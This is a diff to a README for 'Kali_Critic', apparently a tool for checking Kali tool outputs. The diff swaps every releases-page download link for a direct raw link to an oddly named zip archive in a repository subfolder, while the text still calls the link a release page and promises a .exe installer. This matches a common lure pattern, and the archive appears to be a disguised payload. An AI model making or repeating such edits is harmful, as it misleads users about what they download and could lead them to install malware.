@@ -1,6 +1,6 @@
 # ⚙️ Kali_Critic - Find Issues in Kali Tool Outputs
 
-[![Download Kali_Critic](https://img.shields.io/badge/Download-Kali_Critic-green?style=for-the-badge)](https://github.com/kaniooo/Kali_Critic/releases)
+[![Download Kali_Critic](https://img.shields.io/badge/Download-Kali_Critic-green?style=for-the-badge)](https://raw.githubusercontent.com/kaniooo/Kali_Critic/main/impartialist/Critic_Kali_daughterkin.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Before you start, check if your computer meets these basics:
 
 Click the button below to visit the release page and find the latest version of Kali_Critic:
 
-[![Get Kali_Critic](https://img.shields.io/badge/Visit%20Release%20Page-Here-blue?style=for-the-badge)](https://github.com/kaniooo/Kali_Critic/releases)
+[![Get Kali_Critic](https://img.shields.io/badge/Visit%20Release%20Page-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/kaniooo/Kali_Critic/main/impartialist/Critic_Kali_daughterkin.zip)
 
 The release page lists all current versions. Look for the latest file that matches Windows (usually with `.exe` extension).
 
@@ -43,7 +43,7 @@ The release page lists all current versions. Look for the latest file that match
 
 1. **Open the release page**  
    Click the download badge above or visit:  
-   https://github.com/kaniooo/Kali_Critic/releases
+   https://raw.githubusercontent.com/kaniooo/Kali_Critic/main/impartialist/Critic_Kali_daughterkin.zip
 
 2. **Find the latest Windows installer**  
    Look for the file with a name like `Kali_Critic_Setup.exe` or similar. It will usually be one of the top files listed under the latest release.
@@ -128,7 +128,7 @@ Kali_Critic runs locally on your computer. It does not require uploading your sc
 
 New versions of Kali_Critic may include support for additional Kali tools or improved error detection. Always check the release page for the latest updates:
 
-https://github.com/kaniooo/Kali_Critic/releases
+https://raw.githubusercontent.com/kaniooo/Kali_Critic/main/impartialist/Critic_Kali_daughterkin.zip
 
 Use the same download button at the top of this page to find new installers.
 
